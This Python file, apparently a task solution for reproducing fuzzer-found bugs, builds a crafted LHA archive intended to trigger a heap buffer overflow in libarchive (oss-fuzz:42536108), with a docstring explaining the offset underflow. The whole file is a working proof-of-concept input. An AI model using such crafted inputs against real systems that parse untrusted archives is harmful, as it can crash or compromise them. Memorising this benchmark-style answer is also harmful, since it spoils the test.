import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input to trigger a heap buffer overflow
        in libarchive's LHA handler (oss-fuzz:42536108).

        The vulnerability lies in the calculation of `archive_start_offset`.
        The formula used is roughly:
        `offset = (current_header_total_size) - (total_bytes_read_from_stream)`

        If `total_bytes_read_from_stream` is larger than `current_header_total_size`,
        the offset becomes negative. This negative offset is later used in a `malloc`
        size calculation, where a large `size` derived from the negative offset
        can lead to an integer overflow, a small allocation, and a subsequent
        `memcpy` that overflows the heap buffer.

        To make `total_bytes_read_from_stream` large, we prepend a valid LHA
        header for an empty file. This advances the stream position. The second,
        triggering header is made very small, causing the offset calculation to
        underflow.
        """

        # Part 1: A valid, minimal LHA level 0 header for an empty file.
        # This serves to advance the stream counter. Its total on-disk size is 26 bytes.
        hdr_size1 = 24
        method1 = b"-lh0-"
        packed_size1 = (0).to_bytes(4, 'little')
        original_size1 = (0).to_bytes(4, 'little')
        timestamp1 = (0).to_bytes(4, 'little')
        attribute1 = (0).to_bytes(2, 'little')
        level1 = b'\x00'
        filename_len1 = 1
        filename1 = b'a'
        crc1 = (0).to_bytes(2, 'little')

        header_data1 = (
            method1 + packed_size1 + original_size1 + timestamp1 +
            attribute1 + level1 + bytes([filename_len1]) + filename1 + crc1
        )
        
        hdr_csum1 = sum(header_data1) % 256
        
        header1 = bytes([hdr_size1, hdr_csum1]) + header_data1

        # Part 2: The triggering LHA level 0 header.
        # This header is crafted to be very small.
        # The body size must be at least 5 bytes for the method string to be read
        # without an out-of-bounds read during header validation.
        hdr_size2 = 5
        
        header_data2 = b"-lh0-"
        hdr_csum2 = sum(header_data2) % 256
        
        header2 = bytes([hdr_size2, hdr_csum2]) + header_data2
        
        poc = header1 + header2

        return poc
